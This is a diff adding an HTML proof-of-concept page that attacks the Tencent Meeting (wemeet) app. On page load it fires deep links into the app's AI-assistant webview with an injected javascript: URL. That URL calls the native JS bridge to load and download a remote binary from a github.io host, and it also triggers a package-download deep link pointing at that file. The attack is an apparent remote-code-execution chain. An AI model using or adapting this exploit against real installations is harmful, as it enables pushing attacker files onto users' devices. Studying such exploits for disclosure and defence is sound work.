@@ -1,0 +1,25 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P35</h1>
+<script>
+document.title='P35L-START';
+var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
+var bin='https://gitwhs.github.io/wm-poc-rce/p25.bin';
+var jsInner="javascript:(function(){document.title='P35YB:'+location.host+'|'+location.protocol;window.__p=function(r){try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}document.title='P35CB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String(r&&r.message||'').slice(0,36)};function c(m,e,p){if(!window.JSCallJavaMgr){document.title='P35NOJSB:'+location.host;return}window.JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p',module:m,method:e,param:p||{},callId:m+'.'+e}))}function fr(u){var f=document.createElement('iframe');f.src=u;document.body.appendChild(f)}c('CommonPlugin','GetPerformance',{});setTimeout(function(){c('CommonPlugin','LoadUrl',{url:bin})},600);setTimeout(function(){c('CommonPlugin','DownloadFile',{url:bin,fileName:'p35.bin'})},1200);setTimeout(function(){fr('wemeet://page/package_download?url='+bin+'&package_url='+bin)},1800)})()".replace(/bin/g,"'"+bin+"'");
+function frame(src, label){
+  document.title=label;
+  var f=document.createElement('iframe');
+  f.src=src;
+  document.body.appendChild(f);
+}
+var ybOff='wemeet://page/yuanbao_ai_assistant/ai_assistant_common?scene_flag=1&url='+encodeURIComponent(official);
+var ybJs='wemeet://page/yuanbao_ai_assistant/ai_assistant_common?scene_flag=1&url='+encodeURIComponent(jsInner);
+var ybAfterOff='wemeet://page/yuanbao_ai_assistant/open_ai_assistant_after_meeting?scene_flag=1&url='+encodeURIComponent(official);
+var ybAfterJs='wemeet://page/yuanbao_ai_assistant/open_ai_assistant_after_meeting?scene_flag=1&url='+encodeURIComponent(jsInner);
+setTimeout(function(){ frame(ybOff,'P35L-YBOFF'); }, 700);
+setTimeout(function(){ frame(ybJs,'P35L-YBJS'); }, 10000);
+setTimeout(function(){ frame(ybAfterOff,'P35L-AFOFF'); }, 16000);
+setTimeout(function(){ frame(ybAfterJs,'P35L-AFJS'); }, 22000);
+setTimeout(function(){ document.title='P35L-DONE'; }, 28000);
+</script>
+</body></html>
